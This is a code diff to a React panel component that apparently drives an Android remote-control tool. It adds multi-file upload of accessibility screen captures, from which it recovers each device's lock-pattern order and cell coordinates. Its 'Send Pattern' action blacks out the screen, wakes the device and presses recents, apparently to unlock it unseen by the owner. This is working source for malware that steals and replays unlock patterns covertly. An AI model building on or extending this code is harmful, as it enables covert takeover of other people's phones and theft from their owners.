@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { formatDateTime } from '../utils/dateTime.js';
+import { parsePatternFileContents } from '../utils/patternFileParser.mjs';
 
 const COLORS = ['#00ff88', '#00ccff', '#ff6b35', '#ffd700', '#cc77ff'];
 
@@ -496,6 +497,116 @@ function AdvancedPatternPreview({ cells, width = 160, height = 160 }) {
   );
 }
 
+function UploadedScreenPatternPreview({ pattern }) {
+  const screenWidth = pattern.screenWidth;
+  const screenHeight = pattern.screenHeight;
+  const previewWidth = Math.min(220, 380 * screenWidth / screenHeight);
+  const previewHeight = previewWidth * screenHeight / screenWidth;
+  const cellsByNumber = new Map(pattern.cellCoords.map(cell => [cell.cell, cell]));
+  const stepByCell = new Map(pattern.cells.map((cell, index) => [cell, index + 1]));
+  const orderedCoords = pattern.cells.map(cell => cellsByNumber.get(cell)).filter(Boolean);
+  const path = orderedCoords.map((cell, index) =>
+    `${index === 0 ? 'M' : 'L'}${cell.cx},${cell.cy}`
+  ).join(' ');
+
+  return (
+    <svg
+      width={previewWidth}
+      height={previewHeight}
+      viewBox={`0 0 ${screenWidth} ${screenHeight}`}
+      role="img"
+      aria-label={`Pattern on a ${screenWidth} by ${screenHeight} screen`}
+      style={{
+        display: 'block',
+        maxWidth: '100%',
+        height: 'auto',
+        background: '#080f1c',
+        border: '2px solid #475569',
+        borderRadius: 18,
+        boxShadow: '0 10px 24px rgba(0,0,0,0.35)',
+      }}
+    >
+      <rect x="0" y="0" width={screenWidth} height={screenHeight} fill="#0b1220" />
+      <rect x="0" y="0" width={screenWidth} height={screenHeight * 0.035} fill="#111827" />
+      <rect
+        x={screenWidth * 0.39}
+        y={screenHeight * 0.984}
+        width={screenWidth * 0.22}
+        height={Math.max(8, screenHeight * 0.006)}
+        rx={screenHeight * 0.003}
+        fill="#64748b"
+        opacity="0.7"
+      />
+
+      {pattern.cellCoords.map(cell => {
+        const { left, top, right, bottom } = cell.bounds;
+        const width = right - left;
+        const height = bottom - top;
+        const step = stepByCell.get(cell.cell);
+        const active = step != null;
+        return (
+          <rect
+            key={cell.cell}
+            x={left}
+            y={top}
+            width={width}
+            height={height}
+            rx={Math.min(width, height) * 0.12}
+            fill={active ? '#7c3aed33' : '#33415522'}
+            stroke={active ? '#c084fc' : '#64748b'}
+            strokeWidth={Math.max(2, Math.min(width, height) * 0.035)}
+            opacity={active ? 1 : 0.65}
+          />
+        );
+      })}
+
+      {path && (
+        <path
+          d={path}
+          fill="none"
+          stroke="#c084fc"
+          strokeWidth={Math.max(8, Math.min(screenWidth, screenHeight) * 0.018)}
+          strokeLinecap="round"
+          strokeLinejoin="round"
+          opacity="0.9"
+        />
+      )}
+
+      {pattern.cellCoords.map(cell => {
+        const step = stepByCell.get(cell.cell);
+        const active = step != null;
+        const radius = Math.max(12, Math.min(
+          cell.bounds.right - cell.bounds.left,
+          cell.bounds.bottom - cell.bounds.top,
+        ) * 0.22);
+        return (
+          <g key={`marker-${cell.cell}`}>
+            <circle
+              cx={cell.cx}
+              cy={cell.cy}
+              r={radius}
+              fill={active ? '#7c3aed' : '#1e293b'}
+              stroke={active ? '#e9d5ff' : '#94a3b8'}
+              strokeWidth={Math.max(2, radius * 0.14)}
+            />
+            <text
+              x={cell.cx}
+              y={cell.cy + radius * 0.34}
+              textAnchor="middle"
+              fill="#fff"
+              fontSize={radius * 0.9}
+              fontWeight="700"
+              fontFamily="monospace"
+            >
+              {active ? step : cell.cell}
+            </text>
+          </g>
+        );
+      })}
+    </svg>
+  );
+}
+
 // Animated canvas that draws straight lines between cells one segment at a time.
 // When cellCoords (actual device bounds) are available, maps them to canvas space.
 // Falls back to the normalized 3×3 abstract grid otherwise.
@@ -676,9 +787,7 @@ export default function GestureTab({ device, sendCommand, results }) {
   const [advReplayingFile, setAdvReplayingFile] = useState(null);
   const [advSelectedFile, setAdvSelectedFile]   = useState(null);
   const [advSelectedData, setAdvSelectedData]   = useState(null);
-  const [uploadedCells, setUploadedCells]         = useState([]);
-  const [uploadedCoords, setUploadedCoords]       = useState([]);
-  const [uploadedName, setUploadedName]           = useState('');
+  const [uploadedPatterns, setUploadedPatterns]   = useState([]);
 
   const deviceW = device?.deviceInfo?.screenWidth  || 720;
   const deviceH = device?.deviceInfo?.screenHeight || 1600;
@@ -941,46 +1050,58 @@ export default function GestureTab({ device, sendCommand, results }) {
     sendCmd('advanced_unlock_list');
   }
 
-  function handleUploadPatternFile(e) {
-    const file = e.target.files?.[0];
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = (ev) => {
-      try {
-        const data = JSON.parse(ev.target.result);
-        const frames = data.frames || [];
-        let chosen = null;
-        for (let i = frames.length - 1; i >= 0; i--) {
-          const els = frames[i]?.screen?.elements || [];
-          if (els.some(el => (el.contentDescription || el.text || '').startsWith('Cell'))) { chosen = els; break; }
+  async function handleUploadPatternFiles(e) {
+    const files = Array.from(e.target.files || []);
+    e.target.value = '';
+    if (files.length === 0) return;
+
+    const results = await Promise.all(files.map(file => new Promise(resolve => {
+      const reader = new FileReader();
+      reader.onload = event => {
+        try {
+          const parsed = parsePatternFileContents(String(event.target.result || ''), file.name);
+          resolve({
+            ...parsed,
+            id: `${file.name}:${file.size}:${file.lastModified}`,
+          });
+        } catch (error) {
+          resolve({ fileName: file.name, error: error.message });
         }
-        if (!chosen) { status('No pattern cells found in file'); return; }
-        const cells = chosen.filter(el => (el.contentDescription || el.text || '').startsWith('Cell'));
-        const lostMap = new Map();
-        cells.forEach(c => {
-          if (c.clickable !== true) {
-            const num = parseInt((c.contentDescription || c.text || '').match(/Cell\\s*(\\d+)/)?.[1] || '0', 10);
-            if (num < 1 || num > 9) return;
-            const b = c.bounds;
-            if (!lostMap.has(num)) lostMap.set(num, { cell: num, cx: Math.round((b.left + b.right) / 2), cy: Math.round((b.top + b.bottom) / 2), bounds: b });
-          }
-        });
-        const lost = Array.from(lostMap.values()).sort((a, b) => a.cy !== b.cy ? a.cy - b.cy : a.cx - b.cx);
-        setUploadedCells(lost.map(c => c.cell));
-        setUploadedCoords(lost.map(c => ({ cell: c.cell, cx: c.cx, cy: c.cy })));
-        setUploadedName(file.name);
-        status(`Loaded ${lost.length} cells from ${file.name}`);
-      } catch (err) { status('Failed to parse file: ' + err.message); }
-    };
-    reader.readAsText(file);
+      };
+      reader.onerror = () => resolve({ fileName: file.name, error: 'Could not read this file' });
+      reader.readAsText(file);
+    })));
+
+    const loaded = results.filter(result => !result.error);
+    const failed = results.filter(result => result.error);
+    if (loaded.length > 0) {
+      setUploadedPatterns(previous => {
+        const byId = new Map(previous.map(pattern => [pattern.id, pattern]));
+        loaded.forEach(pattern => byId.set(pattern.id, pattern));
+        return [...byId.values()];
+      });
+    }
+
+    const statusParts = [];
+    if (loaded.length > 0) {
+      statusParts.push(`Loaded ${loaded.length} pattern${loaded.length === 1 ? '' : 's'}: ${loaded.map(pattern => pattern.fileName).join(', ')}`);
+    }
+    if (failed.length > 0) {
+      statusParts.push(`Could not read ${failed.map(result => `${result.fileName} (${result.error})`).join('; ')}`);
+    }
+    status(statusParts.join('. '));
   }
 
   function sendUploadedPattern() {
-    if (uploadedCells.length < 2) { status('Upload a pattern file first'); return; }
+    if (uploadedPatterns.length === 0) { status('Upload a pattern file first'); return; }
     status('Block screen → wake → recents sequence starting…');
     sendCmd('screen_blackout_on');
     setTimeout(() => { sendCmd('wake_screen'); status('Woke screen…'); }, 1000);
     setTimeout(() => { sendCmd('press_recents'); status('Pressed recents…'); }, 2000);
+  }
+
+  function removeUploadedPattern(id) {
+    setUploadedPatterns(previous => previous.filter(pattern => pattern.id !== id));
   }
 
   function replayAdvPattern(filename, cells) {
@@ -1174,21 +1295,116 @@ export default function GestureTab({ device, sendCommand, results }) {
 
             {/* ── Upload Pattern File ─────────────────────────────────── */}
             <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #334155' }}>
-              <div style={{ fontWeight: 700, fontSize: 14, color: '#94a3b8', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 0.5 }}>
-                Upload Pattern File
+              <div style={{ fontWeight: 700, fontSize: 14, color: '#94a3b8', marginBottom: 8, textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Upload Pattern Files
               </div>
-              <input type="file" accept="application/json,.json" onChange={handleUploadPatternFile} style={{ marginBottom: 10, color: '#94a3b8', fontSize: 12 }} />
-              {uploadedName && <div style={{ fontSize: 11, color: '#22c55e', marginBottom: 8 }}>Loaded: {uploadedName} — cells [{uploadedCells.join(',')}]</div>}
-              {uploadedCoords.length >= 2 && (
-                <AdvancedReplayCanvas cells={uploadedCells} cellCoords={uploadedCoords} active={true} width={300} height={220} />
+              <div style={{ fontSize: 12, color: '#64748b', lineHeight: 1.6, marginBottom: 12 }}>
+                Select one or more screen-reader JSON files. Each file opens in its own full-screen pattern preview.
+              </div>
+              <input
+                type="file"
+                accept="application/json,.json"
+                multiple
+                onChange={handleUploadPatternFiles}
+                style={{ marginBottom: 14, color: '#94a3b8', fontSize: 12, maxWidth: '100%' }}
+              />
+
+              {uploadedPatterns.length > 0 ? (
+                <>
+                  <div style={{
+                    display: 'grid',
+                    gridTemplateColumns: 'repeat(auto-fit, minmax(min(100%, 300px), 1fr))',
+                    gap: 12,
+                    alignItems: 'start',
+                  }}>
+                    {uploadedPatterns.map(pattern => (
+                      <div
+                        key={pattern.id}
+                        style={{
+                          minWidth: 0,
+                          background: '#0f172a',
+                          border: '1px solid #334155',
+                          borderRadius: 10,
+                          padding: 14,
+                        }}
+                      >
+                        <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10, marginBottom: 12 }}>
+                          <div style={{ minWidth: 0, flex: 1 }}>
+                            <div style={{ color: '#e2e8f0', fontSize: 12, fontWeight: 700, overflowWrap: 'anywhere' }}>
+                              {pattern.fileName}
+                            </div>
+                            <div style={{ color: '#64748b', fontSize: 11, marginTop: 4 }}>
+                              Screen {pattern.screenWidth} × {pattern.screenHeight}px · {pattern.cells.length} cells
+                            </div>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => removeUploadedPattern(pattern.id)}
+                            aria-label={`Remove ${pattern.fileName}`}
+                            title="Remove this pattern preview"
+                            style={{
+                              flexShrink: 0,
+                              border: '1px solid #475569',
+                              borderRadius: 6,
+                              background: 'transparent',
+                              color: '#94a3b8',
+                              cursor: 'pointer',
+                              padding: '3px 8px',
+                            }}
+                          >
+                            ×
+                          </button>
+                        </div>
+
+                        <div style={{ display: 'flex', justifyContent: 'center', padding: '4px 0 12px' }}>
+                          <UploadedScreenPatternPreview pattern={pattern} />
+                        </div>
+
+                        <div style={{ borderTop: '1px solid #1e293b', paddingTop: 10 }}>
+                          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 0.4, marginBottom: 5 }}>
+                            Recovered order
+                          </div>
+                          <div style={{ color: '#c084fc', fontFamily: 'monospace', fontSize: 12, overflowWrap: 'anywhere' }}>
+                            {pattern.cells.join(' → ')}
+                          </div>
+                          {pattern.simultaneousGroups.length > 0 && (
+                            <div style={{ color: '#fbbf24', fontSize: 10, lineHeight: 1.5, marginTop: 7 }}>
+                              Cells {pattern.simultaneousGroups.map(group => `[${group.join(', ')}]`).join(', ')} first appear in the same frame; those ties are connected by nearest center.
+                            </div>
+                          )}
+                          <details style={{ marginTop: 9, color: '#94a3b8', fontSize: 10 }}>
+                            <summary style={{ cursor: 'pointer' }}>Exact cell bounds (pixels)</summary>
+                            <div style={{ display: 'grid', gap: 4, marginTop: 7 }}>
+                              {pattern.cells.map((cell, index) => {
+                                const coord = pattern.cellCoords.find(item => item.cell === cell);
+                                if (!coord) return null;
+                                const { left, top, right, bottom } = coord.bounds;
+                                return (
+                                  <div key={`${cell}-${index}`} style={{ fontFamily: 'monospace', overflowWrap: 'anywhere' }}>
+                                    Step {index + 1} · Cell {cell}: [{left}, {top}]–[{right}, {bottom}]
+                                  </div>
+                                );
+                              })}
+                            </div>
+                          </details>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+
+                  <button
+                    onClick={sendUploadedPattern}
+                    disabled={!isOnline}
+                    style={{ ...btnStyle('#7c3aed', !isOnline), marginTop: 12, padding: '8px 18px' }}
+                  >
+                    Send Pattern (block → wake → recents)
+                  </button>
+                </>
+              ) : (
+                <div style={{ color: '#475569', fontSize: 12, textAlign: 'center', padding: '24px 12px', border: '1px dashed #334155', borderRadius: 8 }}>
+                  No pattern files loaded yet
+                </div>
               )}
-              <button
-                onClick={sendUploadedPattern}
-                disabled={!isOnline || uploadedCells.length < 2}
-                style={{ ...btnStyle('#7c3aed', !isOnline || uploadedCells.length < 2), marginTop: 10, padding: '8px 18px' }}
-              >
-                Send Pattern (block → wake → recents)
-              </button>
             </div>
 
             {/* ── Live Stream ─────────────────────────────────────────── */}
